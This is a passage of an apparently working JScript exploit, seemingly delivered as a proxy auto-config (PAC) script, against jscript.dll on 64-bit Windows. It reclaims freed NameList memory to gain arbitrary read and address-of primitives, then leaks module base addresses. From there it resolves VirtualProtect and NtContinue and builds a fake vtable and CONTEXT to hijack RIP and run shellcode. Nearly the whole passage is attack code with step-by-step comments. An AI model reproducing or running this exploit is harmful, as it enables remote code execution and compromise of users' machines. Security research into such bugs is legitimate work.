        PrimaryVvalPropName += CreateVar64(0x80, LeakedVvalAddress.low, LeakedVvalAddress.high, 0, 0); // Type 0x80 is a VAR reference
    }
    
    while(PrimaryVvalPropName.length < 0x239) PrimaryVvalPropName += "A";
    
    // Re-claim with leaked VVAL address vars (to be dereferenced for anchor object index extraction)
    
    StartTimer();
    NewUntrackedVarSet();
    
    for(var i = 0; i < NameListAnchorCount; i++) {
        NameListAnchors[i][PrimaryVvalPropName] = 1;
    }
    
    EndTimer("Anchor index VAR creation + re-claim");
    
    // Extract NameList anchor index through untracked var dereference to leaked VVAL prefix VAR
    
    StartTimer();
    var LeakedVvalVar;

    for(var i = 0; i < UntrackedVarSet.length; i++) {
        if(typeof UntrackedVarSet[i] === "number") {
            LeakedAnchorIndex = parseInt(UntrackedVarSet[i] + ""); // Attempting to access the untracked var without parseInt will fail ("null or not an object")
            LeakedVvalVar = UntrackedVarSet[i]; // The + "" trick alone does not seeem to be enough to populate this with the actual value
            break;
        }
    }
    
    DebugLog("Leaked anchor object index: " + LeakedAnchorIndex.toString(16));
    
    // Verify that the VAR within the leaked VVAL can be influenced by directly freeing/re-claiming the NameList associated with the leaked NameList anchor object (whose index is now known)
    
    ReClaimNameList(0x11, "A");
    
    if(LeakedVvalVar + "" != 0x11) {
        DebugLog("Failed to extract final VVAL index via re-claim");
        return 0;
    }
    
    EndTimer("Anchor index VAR scan");

    // Create the mutable variable which will be used throughout the remainder of the exploit and re=claim with VAR-referencing-VAR to it for dereference
    
    ReClaimNameList(0, CreateVar64(0x3, 0x22, 0, 0, 0));
    PrimaryVvalPropName = "AAAAAAAA"; // 2 wide chars (4 bytes) plus the 4 byte BSTR length gives 8 bytes: the size of the two GcBlock linked list pointers. Everything after this point can be fake VARs and a tail padding.

    for(var i = 0; i < 46; i++) {
        PrimaryVvalPropName += CreateVar64(0x80, LeakedVvalAddress.low + 0x40, LeakedVvalAddress.high, 0, 0); // +0x40 is the offset to property name field of 64-bit VVAL struct. Type 0x80 is a VAR reference
    }
    
    while(PrimaryVvalPropName.length < 0x239) PrimaryVvalPropName += "A"; // Dynamically pad the end of the proeprty name to correct length
    
    // Re-claim with leaked VVAL name property address vars (this is the memory address of the mutable variable that will be created)
    
    StartTimer();
    NewUntrackedVarSet();
    
    for(var i = 0; i < NameListAnchorCount; i++) {
        NameListAnchors[i][PrimaryVvalPropName] = 1;
    }
    
    EndTimer("Mutable VAR reference creation + re-claim");
    StartTimer();
    
    for(var i = 0; i < UntrackedVarSet.length; i++) {
        if(typeof UntrackedVarSet[i] === "number") {
            if(UntrackedVarSet[i] + "" == 0x22) {
                MutableVar = UntrackedVarSet[i];
                break;
            }
        }
    }
    
    // Verify the mutable var can be changed via simple re-claim
    
    ReClaimNameList(0, CreateVar64(0x3, 0x33, 0, 0, 0));
    
    if(MutableVar + "" != 0x33) {
        DebugLog("Failed to verify mutable variable modification via re-claim");
        return 0;
    }
    
    EndTimer("Mutable VAR reference scan");
    
    // Test arbitrary read primitive

    var MutableVarAddress = MakeDouble(LeakedVvalAddress.high, LeakedVvalAddress.low + 0x40);
    var FirstByte = LeakByte64(MutableVarAddress);
    
    if(LeakByte64(MutableVarAddress) != 0x8) { // Change mutable var to a BSTR pointing at itself.
        DebugLog("Memory leak test failed");
        return 0;
    }
    
    // Derive jscript.dll base from leaked Object vtable

    StartTimer();
    var DissectedObj = new Object();
    var ObjectAddress = LeakObjectAddress64(LeakedVvalAddress, DissectedObj);
    var VtableAddress = LeakQword64(ObjectAddress);
    var JScriptBase = DiveModuleBase64(VtableAddress);
    
    if(!JScriptBase.low && !JScriptBase.high) {
        DebugLog("Failed to leak JScript.dll base address");
        return 0;
    }
    
    EndTimer("JScriptBase base leak");
    DebugLog("Leaked JScript base address: 0x" + JScriptBase.high.toString(16) + JScriptBase.low.toString(16));
    
    // Extract the first Kernel32.dll import from Jscript.dll IAT to dive for its base
    
    StartTimer();
    var Kernel32Base = BaseFromImports64(JScriptBase, [0x4e52454b, 0x32334c45]);
    EndTimer("Kernel32.dll base resolution");
    
    if(!Kernel32Base.low && !Kernel32Base.high) {
        DebugLog("Kernel32.dll base resolution via Jscript.dll imports failed.");
        return 0;
    }
    
    // Resolve APIs for command execution: NTDLL.DLL!NtContinue, KERNEL32.DLL!VirtualProtect
    
    var VirtualProtectAddress = ResolveExport64(Kernel32Base, [ 0x74726956, 0x506c6175, 0x65746f72, 0x00007463 ]); // VirtualProtect
    
    if(!VirtualProtectAddress.low && !VirtualProtectAddress.high) {
        DebugLog("Failed to resolve address of KERNEL32.DLL!VirtualProtect");
        return 0;
    }
    
    DebugLog("Successfully resolved address of VirtualProtect to: 0x" + VirtualProtectAddress.high.toString(16) + VirtualProtectAddress.low.toString(16));
    StartTimer();
    var MsvcrtBase = BaseFromImports64(JScriptBase, [0x6376736d, 0x642e7472]);
    EndTimer("MsvcrtBase base leak");
    
    if(!MsvcrtBase.low && !MsvcrtBase.high) {
        DebugLog("Msvcrt.dll base resolution via Jscript.dll imports failed.");
        return 0;
    }
    
    var NtdllBase = BaseFromImports64(MsvcrtBase, [0x6c64746e, 0x6c642e6c]);
    
    if(!NtdllBase.low && !NtdllBase.high) {
        DebugLog("Ntdll.dll base resolution via Msvcrt.dll imports failed.");
        return 0;
    }
    
    var NtContinueAddress = ResolveExport64(NtdllBase, [0x6f43744e, 0x6e69746e]);
    
    if(!NtContinueAddress.low && !NtContinueAddress.high) {
        DebugLog("Failed to resolve address of NTDLL.DLL!NtContinue");
        return 0;
    }
    
    // Allocate memory for shellcode, API output and an artificial stack
    
    var ShellcodeStr = TableToUnicode(Shellcode);
    var ShellcodeLen = MakeDouble(0, (ShellcodeStr.length * 2));
    ShellcodeStr = ShellcodeStr.substr(0, ShellcodeStr.length); // This trick is essential to ensure the "address of" primitive gets the actual address of the shellcode data and not another VAR in a chain of VARs (this happens when a VAR is appended to another repeaatedly as is the case here)
    var ShellcodeAddress = LeakObjectAddress64(LeakedVvalAddress, ShellcodeStr);
    DebugLog("Shellcode address: 0x" + ShellcodeAddress.high.toString(16) + ShellcodeAddress.low.toString(16));
    
    var ArtificialStackStr = Array(0x10000).join('\u0101');
    ArtificialStackStr += "A"; // +2 for BSTR start address)
    ArtificialStackStr += DwordArrayToBytes([ShellcodeAddress.low]);
    ArtificialStackStr += DwordArrayToBytes([ShellcodeAddress.high]);
    ArtificialStackStr = ArtificialStackStr.substr(0, ArtificialStackStr.length);
    var ArtificialStackAddress = LeakObjectAddress64(LeakedVvalAddress, ArtificialStackStr);
    ArtificialStackAddress.low += ((ArtificialStackStr.length * 2) - 0x8); // Point RSP at the return address to the shellcode. The address consistently ends up an 0x8 multiple on Windows 7 IE8 64-bit.
    
    var WritableStr = "";
    WritableStr += DwordArrayToBytes([0]);
    WritableStr = WritableStr.substr(0, WritableStr.length);
    var WritableAddress = LeakObjectAddress64(LeakedVvalAddress, WritableStr);
                                            
    // Construct a fake vtable and fake object for use within mutable var property name
    
    var FakeVtable = CreateFakeVtable(NtContinueAddress);
    FakeVtable = FakeVtable.substr(0, FakeVtable.length);
    var FakeVtableAddress = LeakObjectAddress64(LeakedVvalAddress, FakeVtable);
    var MutableVarAddress = MakeDouble(LeakedVvalAddress.high, LeakedVvalAddress.low + 0x40);
    var FakeObjAddress = MakeDouble(LeakedVvalAddress.high, LeakedVvalAddress.low + 96);
    var RipHijackPropName = CreateVar64(0x81, LeakedVvalAddress.low + 96, LeakedVvalAddress.high, 0, 0) + CreateVar64(0, FakeVtableAddress.low, FakeVtableAddress.high, 0, 0) + MakeContext64(ArtificialStackAddress, VirtualProtectAddress, ShellcodeAddress, ShellcodeLen, WritableAddress); // 96 is the 64 prop name offset plus size of mutable VAR and next VAR Type field.
    
    /*
    
    Trigger RIP hijack:
    1. Mutable var is set to a 0x81 object reference. Thus accessing it, will cause the VAR at its object pointer to be accessed instead.
    2. At offset 96 from the start of the mutable var at the start of the property name, is the fake object. Its most important field is its vtable pointer, which points into the fake vtable region passed the padding.
    3. The fake vtable contains a typeof method pointer to NTDLL.DLL!NtContinue.
    4. When the typeof method pointer is loaded from the fake object in the property name, the pointer to the vtable will be stored in RCX.
    
    Property name:
    
    [Mutable var]
    [Empty 0 Type for fake VAR]
    [Vtable pointer] <- RCX points here ie. the address of the vtable (the object address) not the value of the vtable address.
    [CONTEXT]
    
    Mutable VAR points at the empty VAR appended to itself (+8). This address is considered to be an object (and the VAR object pointer is actually the vtable pointer)
    */
    
    ReClaimNameList(0, RipHijackPropName);
    DebugLog("Artificial stack pointer address at 0x" + ArtificialStackAddress.high.toString(16) + " " + ArtificialStackAddress.low.toString(16) +" shellcode at 0x" + ShellcodeAddress.high.toString(16) + ShellcodeAddress.low.toString(16) + " CONTEXT pointer: 0x" + FakeObjAddress.high.toString(16) + FakeObjAddress.low.toString(16));
    typeof MutableVar;
}

function FindProxyForURL(url, host){
    return "DIRECT";
}

Exploit();
